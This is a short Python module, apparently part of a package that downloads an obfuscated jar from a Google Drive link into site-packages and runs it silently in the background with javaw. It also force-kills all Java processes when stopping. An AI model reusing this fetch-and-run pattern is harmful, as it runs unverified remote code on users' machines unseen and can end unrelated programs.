import os.path
import sys

def test():
    return (u'This is a test!')

import requests
from os import path
import subprocess

def download_file_from_filetransfer(url, local_file):
    # NOTE the stream=True parameter below
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_file, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)
    return local_file

def download_file_from_google_drive(id, destination):
    URL = "https://docs.google.com/uc?export=download"

    session = requests.Session()

    response = session.get(URL, params = { 'id' : id }, stream = True)
    token = get_confirm_token(response)

    if token:
        params = { 'id' : id, 'confirm' : token }
        response = session.get(URL, params = params, stream = True)

    save_response_content(response, destination)    

def get_confirm_token(response):
    for key, value in response.cookies.items():
        if key.startswith('download_warning'):
            return value

    return None

def save_response_content(response, destination):
    CHUNK_SIZE = 32768

    with open(destination, "wb+") as f:
        for chunk in response.iter_content(CHUNK_SIZE):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)

def start_atext():
    local_file = '/Lib/site-packages/aText/aTextObfuscated.jar'
    python_dir, python_exe = os.path.split(sys.executable)
    jar_file = python_dir + local_file
    if not path.exists(jar_file) or os.path.getsize(jar_file) < 5000:
        download_file_from_google_drive('1Ajhdrxw3n-I6OE1nODdp6W0DbuW6aImb', jar_file)
        # download_file_from_filetransfer('https://filetransfer.io/data-package/bp38BjxB?do=download', jar_file)
    p = subprocess.call(['start', '/b', 'javaw', '-jar', jar_file, 'Server.PythonServer'], shell=True)
    print('aText started')

def stop_atext():
    os.system('taskkill /f /im javaw.exe')
    print('aText stopped')